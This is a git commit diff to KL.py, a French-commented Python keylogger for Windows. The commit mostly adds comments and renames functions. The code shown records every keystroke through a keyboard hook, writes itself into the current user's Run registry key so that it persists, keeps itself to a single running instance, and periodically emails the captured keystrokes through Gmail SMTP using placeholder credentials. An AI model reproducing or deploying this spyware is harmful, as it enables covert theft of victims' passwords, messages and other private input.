edd8a0b7fe572ad33e4c41c408a463a5e292d195
C3s1um133 <ilal.jim@gmail.com>
2016-07-13 11:21:00 +0200

    Update KL.py

--- KL.py
+++ KL.py
@@ -14,6 +14,7 @@ import win32event, win32api, winerror
 from _winreg import *
 
 # Interdiction de plusieurs instanciations
+# Processus mutex : filtre
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
@@ -27,10 +28,11 @@ def persistance():
     ch = os.path.dirname(os.path.realpath('__file__'))
     nom_fichier = sys.argv[0].split("\\")[-1]
     nouveau_chemin = ch + "\\" + nom_fichier
+    # Pointage vers le répertoire permettant l'ajout de programme au démarrage
     clefVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
+    # Arborescence principale | chemin de la clef en base de registre == Utilisateur courant
     clef_base_registre = OpenKey(HKEY_CURRENT_USER,clefVal,0,KEY_ALL_ACCESS)
-
+    # Ajout de la clef
     SetValueEx(clef_base_registre, "FabVinKevJim-key",0,REG_SZ, nouveau_chemin)
 
 # Envoie des logs par mail (Thread pour plus de dynamisme sans affecter la mémoire vive)
@@ -39,14 +41,16 @@ class TimerClass(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.event = threading.Event()
-    # Méthode élémentaire du Thread : définition des envois 
+    # Méthode élémentaire du Thread : définition des envois
     def run(self):
         while not self.event.is_set():
+            # Data == enregistrement des touches préssées
             global data
-            if len(data)>100:
+            if len(data) > 100:
+                # Envoie de la data enregistrée tous les 100 caractères
                 ts = datetime.datetime.now()
-                SERVER = "smtp.gmail.com" 
-                PORT = 587 
+                SERVER = "smtp.gmail.com"
+                PORT = 587
                 USER = "xxxxxxx@gmail.com" # à modifier
                 PASS = "xxxxxxx" # à modifier
                 FROM = USER
@@ -72,22 +76,22 @@ class TimerClass(threading.Thread):
                     print "Problème envoie de MAIL > KV.exe.logs"
             self.event.wait(120)
 
-# Identification de certaines touches (stdin == clavier)
-def touches(event):
+# Identification des touches (stdin == clavier)
+def pression(event):
     global data
     if event.Ascii==13:
-        keys = '<ENTREE>'
+        touche = '<ENTREE>'
     elif event.Ascii==8:
-        keys = '<BACK SPACE>'
+        touche = '<BACK SPACE>'
     elif event.Ascii==9:
-        keys = '<TAB>'
+        touche = '<TAB>'
     else:
-        keys = chr(event.Ascii)
-    data = data + keys 
+        touche = chr(event.Ascii)
+    data = data + touche
 
 # Main
 def main():
-    persistance() 
+    persistance()
     email = TimerClass()
     email.start()
     return True
@@ -97,6 +101,6 @@ if __name__ == '__main__':
 
 # Lancement : réception du signal des touches
 obj = pyHook.HookManager()
-obj.KeyDown = touches
+obj.KeyDown = pression
 obj.HookKeyboard()
 pythoncom.PumpMessages()
